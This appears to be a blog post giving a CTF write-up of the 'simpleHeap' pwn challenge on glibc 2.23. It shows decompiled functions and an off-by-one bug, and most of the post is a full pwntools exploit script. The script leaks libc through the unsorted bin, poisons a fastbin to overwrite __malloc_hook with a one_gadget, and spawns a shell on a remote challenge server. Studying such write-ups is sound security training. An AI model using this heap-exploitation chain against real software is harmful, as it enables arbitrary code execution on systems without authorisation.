---
layout: post
title:  simpleHeap
date:   2021-02-14 00:01:01 +0300
image:  2021-02-14-boat.jpg
tags:   [ctf,Pwn,V&N2020公开赛,heap,ubuntu16]
---

#### main()

```assembly
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  sub_A39(a1, a2, a3);
  puts("Welcome to V&N challange!");
  puts("This's a simple heap for you.");
  while ( 1 )
  {
    menu();
    sub_9EA();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        add();
        break;
      case 2u:
        edit();
        break;
      case 3u:
        show();
        break;
      case 4u:
        delete();
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("Please input current choice.");
        break;
    }
  }
}
```

#### menu()

```assembly
int menu()
{
  puts("1.Add");
  puts("2.Edit");
  puts("3.Show");
  puts("4.Delete");
  puts("5.Exit");
  return printf("choice: ");
}
```

#### add()

```assembly
signed int add()
{
  signed int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  signed int v2; // [rsp+Ch] [rbp-4h]

  v1 = sub_AB2();
  if ( v1 == -1 )
    return puts("Full");
  printf("size?");
  result = sub_9EA();
  v2 = result;
  if ( result > 0 && result <= 111 )
  {
    qword_2020A0[v1] = malloc(result);
    if ( !qword_2020A0[v1] )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    dword_202060[v1] = v2;
    printf("content:");
    read(0, qword_2020A0[v1], (unsigned int)dword_202060[v1]);
    result = puts("Done!");
  }
  return result;
}
```

#### sub_AB2()

```assembly
signed __int64 sub_AB2()
{
  signed __int64 result; // rax
  signed int i; // [rsp+0h] [rbp-4h]

  for ( i = 0; i <= 9 && qword_2020A0[i]; ++i )
    ;
  if ( i == 10 )
    result = 0xFFFFFFFFLL;
  else
    result = (unsigned int)i;
  return result;
}
```

返回将要创建的qword_2020A0[]数组的元素的索引。

#### edit()

```assembly
int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  printf("content:");
  sub_C39((__int64)qword_2020A0[v1], dword_202060[v1]);
  return puts("Done!");
}
```

#### sub_C39()

```assembly
__int64 __fastcall sub_C39(__int64 a1, int a2)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)i;
    if ( i > a2 )
      break;
    if ( !read(0, (void *)(i + a1), 1uLL) )
      exit(0);
    if ( *(_BYTE *)(i + a1) == 10 )
    {
      result = i + a1;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

逐个读入内容，但是在判断边界时发生错误，因此存在一个off_by_one漏洞。

#### show()

```assembly
int show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  puts((const char *)qword_2020A0[v1]);
  return puts("Done!");
}
```

#### delete()

```assembly
int delete()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  free(qword_2020A0[v1]);
  qword_2020A0[v1] = 0LL;
  dword_202060[v1] = 0;
  return puts("Done!");
}
```

free堆块，而且指针置0，因此不存在UAF漏洞。

exp：

```assembly
# -*-coding:utf-8-*-
from pwn import *

# context.log_level='debug'
libc = ELF("./libc-2.23.so")

# io = process("./vn_pwn_simpleHeap")
'''
本来想利用pwntools工具，指定ld.so和libc.so的版本来运行程序，结果出错
sh = process(["./lib00/lib/x86_64-linux-gnu/ld-2.31.so", "./hello"],env={"LD_PRELOAD":"./lib00/lib/x86_64-linux-gnu/libc.so.6"})
'''
io = remote("node3.buuoj.cn",28199)

def add(size, content):
    io.recvuntil("choice: ")
    io.sendline(str(1))
    io.recvuntil("size?")
    io.sendline(str(size))
    io.recvuntil("content:")
    io.sendline(content)

def edit(idx,  content):
    io.recvuntil("choice: ")
    io.sendline(str(2))
    io.recvuntil("idx?")
    io.sendline(str(idx))
    io.recvuntil("content:")
    io.sendline(content)

def show(idx):
    io.recvuntil("choice: ")
    io.sendline(str(3))
    io.recvuntil("idx?")
    io.sendline(str(idx))

def delete(idx):
    io.recvuntil("choice: ")
    io.sendline(str(4))
    io.recvuntil("idx?")
    io.sendline(str(idx))

add(0x18, "aaaaaaaa")
add(0x60, "bbbbbbbb")
add(0x60, "cccccccc")
add(0x10, "dddddddd")
'''
0x000 [        ]   [  0x21  ] 0
0x010 [aaaaaaaa]   [        ]
0x020 [        ]   [  0x71  ] 1
0x030 [bbbbbbbb]   [        ]
0x040 [        ]   [        ]
0x050 [        ]   [        ]
0x060 [        ]   [        ]
0x070 [        ]   [        ]
0x080 [        ]   [        ]
0x090 [        ]   [  0x71  ] 2
0x0A0 [cccccccc]   [        ]
0x0B0 [        ]   [        ]
0x0C0 [        ]   [        ]
0x0D0 [        ]   [        ]
0x0E0 [        ]   [        ]
0x0F0 [        ]   [        ]
0x100 [        ] | [  0x21  ] 3
0x110 [dddddddd]   [        ]
          Top Chunk
'''

# 利用off_by_one漏洞，修改index1的大小，使其free后被放入unsorted bin
payload = "e"*0x18 + "\xe1"
edit(0,payload)
delete(1)
'''
0x000 [        ]   [  0x21  ] 0
0x010 [eeeeeeee]   [eeeeeeee]
0x020 [eeeeeeee]   [  0xe1  ] 1 \
0x030 [bbbbbbbb]   [        ]    |
0x040 [        ]   [        ]    |
0x050 [        ]   [        ]    |
0x060 [        ]   [        ]    |
0x070 [        ]   [        ]    |
0x080 [        ]   [        ]    |-> unsorted bin
0x090 [        ]   [  0x71  ] 2  |
0x0A0 [cccccccc]   [        ]    |
0x0B0 [        ]   [        ]    |
0x0C0 [        ]   [        ]    |
0x0D0 [        ]   [        ]    |
0x0E0 [        ]   [        ]    |
0x0F0 [        ]   [        ]   /
0x100 [        ] | [  0x21  ] 3
0x110 [dddddddd]   [        ]
          Top Chunk
'''

add(0x60, "ffffffff")
'''
0x000 [        ]   [  0x21  ] 0
0x010 [eeeeeeee]   [eeeeeeee]
0x020 [eeeeeeee]   [  0x71  ] 1
0x030 [ffffffff]   [        ]
0x040 [        ]   [        ]
0x050 [        ]   [        ]
0x060 [        ]   [        ]
0x070 [        ]   [        ]
0x080 [        ]   [        ]
0x090 [        ]   [  0x71  ] 2  \
0x0A0 [   fd   ]   [   bk   ]    |
0x0B0 [        ]   [        ]    |
0x0C0 [        ]   [        ]    |->unsorted bin
0x0D0 [        ]   [        ]    |
0x0E0 [        ]   [        ]    |
0x0F0 [        ]   [        ]   /
0x100 [        ] | [  0x21  ] 3
0x110 [dddddddd]   [        ]
          Top Chunk
'''

show(2)
addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
print(hex(addr))
# gdb.attach(io)
# raw_input()
'''
x用于在gdb中查看内存的内容
格式: x /nuf <addr>
n表示要显示的内存单元的个数
u表示一个地址单元的长度：
    b表示单字节
    h表示双字节
    w表示四字节
    g表示八字节
f表示显示方式, 可取如下值：
    x按十六进制格式显示变量
    d按十进制格式显示变量
    u按十进制格式显示无符号整型
    o按八进制格式显示变量
    t按二进制格式显示变量
    a按十六进制格式显示变量
    i指令地址格式
    c按字符格式显示变量
	f按浮点数格式显示变量
	
>x/gx 0x************(addr)
0x************(addr) <main_arena+88>: 0x000000000*******
'''
main_arena = addr - 88
base = main_arena - 0x3c4b20
'''
main_arena
root@kali1:~/main_arena_offset# ./main_arena libc-2.23.so 
[+]libc version : glibc 2.23
[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a
[+]main_arena_offset : 0x3c4b20
'''

realloc = base + libc.symbols["__libc_realloc"]
malloc_hook = base + libc.symbols["__malloc_hook"]
fake_chunk = malloc_hook - 0x23

libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

one_gadget = base + libc_one_gadget[1]

add(0x60, "gggggggg")
'''
0x000 [        ]   [  0x21  ] 0
0x010 [eeeeeeee]   [eeeeeeee]
0x020 [eeeeeeee]   [  0x71  ] 1
0x030 [ffffffff]   [        ]
0x040 [        ]   [        ]
0x050 [        ]   [        ]
0x060 [        ]   [        ]
0x070 [        ]   [        ]
0x080 [        ]   [        ]
0x090 [        ]   [  0x71  ] 2&4
0x0A0 [gggggggg]   [        ]
0x0B0 [        ]   [        ]
0x0C0 [        ]   [        ]
0x0D0 [        ]   [        ]
0x0E0 [        ]   [        ]
0x0F0 [        ]   [        ]
0x100 [        ] | [  0x21  ] 3
0x110 [dddddddd]   [        ]
          Top Chunk
'''

delete(4)
'''
0x000 [        ]   [  0x21  ] 0
0x010 [eeeeeeee]   [eeeeeeee]
0x020 [eeeeeeee]   [  0x71  ] 1
0x030 [ffffffff]   [        ]
0x040 [        ]   [        ]
0x050 [        ]   [        ]
0x060 [        ]   [        ]
0x070 [        ]   [        ]
0x080 [        ]   [        ]
0x090 [        ]   [  0x71  ] 2&4 #
0x0A0 [gggggggg]   [        ]     #
0x0B0 [        ]   [        ]     #
0x0C0 [        ]   [        ]     #
0x0D0 [        ]   [        ]     #
0x0E0 [        ]   [        ]     #
0x0F0 [        ]   [        ]     #
0x100 [        ] | [  0x21  ] 3
0x110 [dddddddd]   [        ]
          Top Chunk
'''

edit(2, p64(fake_chunk))
'''
0x000 [        ]   [  0x21  ] 0
0x010 [eeeeeeee]   [eeeeeeee]
0x020 [eeeeeeee]   [  0x71  ] 1
0x030 [ffffffff]   [        ]
0x040 [        ]   [        ]
0x050 [        ]   [        ]
0x060 [        ]   [        ]
0x070 [        ]   [        ]
0x080 [        ]   [        ]
0x090 [        ]   [  0x71  ] 2&4 #
0x0A0 [fk_chunk]   [        ]     #
0x0B0 [        ]   [        ]     #
0x0C0 [        ]   [        ]     #
0x0D0 [        ]   [        ]     #
0x0E0 [        ]   [        ]     #
0x0F0 [        ]   [        ]     #
0x100 [        ] | [  0x21  ] 3
0x110 [dddddddd]   [        ]
          Top Chunk
'''

add(0x60, "hhhhhhhh")

payload = "i"*(0x23 - 0x10 - 0x8) + p64(one_gadget) + p64(realloc+13)
add(0x60, payload)
'''
malloc_hook-0x30[        ] [        ]
malloc_hook-0x20[        ] [     iii]
malloc_hook-0x10[iiiiiiii] [ gadget ]
malloc_hook     [ rlc+13 ] [        ]
'''

io.recvuntil("choice: ")
io.sendline("1")
io.recvuntil("size?")
io.sendline("1")

io.interactive()
```

